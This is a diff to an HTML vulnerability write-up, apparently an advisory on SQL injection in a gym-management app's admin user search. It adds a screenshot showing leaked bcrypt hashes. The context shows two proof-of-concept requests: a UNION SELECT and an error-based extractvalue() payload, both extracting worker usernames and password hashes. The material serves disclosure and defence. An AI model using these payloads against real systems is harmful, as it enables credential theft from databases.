@@ -89,6 +89,10 @@ $result = $conn-&gt;query($sql); // line 473</code></pre>
         <p>Extracts all worker credentials from the <code>workers</code> table:</p>
         <pre><code class="language-http">GET /admin/users/?search_email=&#x27;UNION SELECT 1,username,password_hash,4,5,6,7,8,9,10,11,12,13,14,15 FROM workers-- -</code></pre>
         <p>Result: The <code>firstname</code> column renders the <code>username</code> of each worker, <code>lastname</code> renders the <code>password_hash</code>.</p>
+        <figure>
+            <img src="/assets/gymone-sqli.png" alt="UNION SELECT exfiltrating worker credentials — bcrypt hash visible in the Keresztnév column">
+            <figcaption>UNION SELECT exfiltrating worker credentials &mdash; bcrypt hash visible in the Keresztnév column</figcaption>
+        </figure>
         <h4>&gt; PoC 2 &mdash; Error-based data exfiltration (Sink 2)</h4>
         <p>The COUNT query only returns a number, so UNION is not usable. Error-based injection leaks data via MySQL&#x27;s <code>extractvalue()</code>:</p>
         <pre><code class="language-http">GET /admin/users/?search_name=x&#x27; AND extractvalue(1,concat(0x7e,(SELECT password_hash FROM workers LIMIT 1)))-- -</code></pre>
